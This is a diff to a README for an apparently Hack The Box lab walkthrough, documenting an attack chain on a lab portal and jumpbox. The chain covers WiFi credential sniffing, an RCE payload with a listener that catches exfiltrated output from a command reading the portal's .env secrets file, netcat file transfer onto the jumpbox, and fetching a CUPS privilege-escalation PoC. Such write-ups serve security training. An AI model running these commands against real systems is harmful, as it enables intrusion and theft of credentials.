@@ -48,6 +48,7 @@ RDP (contractor / Contractor2026!)  ->  jumpbox airside-ws01
 | `01_rdp.sh` | RDP into the jumpbox + local enumeration checklist |
 | `02_wifi_sniff.sh` | join the open WiFi, monitor mode, tshark capture + extract creds |
 | `03_craft_rce.py` | prints the behavior-injection payload and runs the output listener |
+| `06_craft_rce_stdlib.py` | **full exploit, stdlib-only** (no `requests`) — use this on the jumpbox |
 | `04_decrypt_aporter.php` | Yii2 `decryptByKey` helper to unwrap the relay password |
 | `05_cups_lpe.sh` | fetch + run the CUPS 2.4.16 LPE PoC |
 
@@ -110,6 +111,34 @@ python3 exploit.py -b http://portal.international.htb \
 ```
 `03_craft_rce.py` prints the hand-rolled payload + starts the listener if you
 want to do it manually.
+
+> **The jumpbox has no internet and no `requests`.** Use the stdlib-only exploit
+> instead — it logs in, fires the payload and catches the exfiltrated output:
+> ```bash
+> python3 06_craft_rce_stdlib.py -b http://portal.international.htb \
+>   -u jenny -p 'Fl1ghtDeck2026!' -c 'cat /var/www/portal/.env' \
+>   --listen-ip <JUMPBOX_10.13.37.x> --listen-port 9999
+> ```
+> The callback address **must be the jumpbox's 10.13.37.x IP**, because the
+> portal has to reach it (not your HTB VPN address).
+
+### Getting files onto the jumpbox (no clipboard, no internet)
+
+The RDP session has no working clipboard and the jumpbox has no internet, but
+**your WSL can reach the jumpbox** (`10.129.x.y`). Push files with netcat:
+
+```bash
+# RDP terminal (jumpbox) - start a receiver:
+nc -l -p 4444 > /tmp/script.py
+
+# WSL (new terminal) - send the file:
+nc -w3 <JUMPBOX_IP> 4444 < /tmp/lay/htb-layover/06_craft_rce_stdlib.py
+```
+Or fix the clipboard with `xclip` on the WSL side:
+```bash
+sudo apt install -y xclip
+cat file.py | xclip -selection clipboard   # then Ctrl+Shift+V in the RDP terminal
+```
 
 ## 4. .env → DB creds → decrypt the relay password
 ```bash
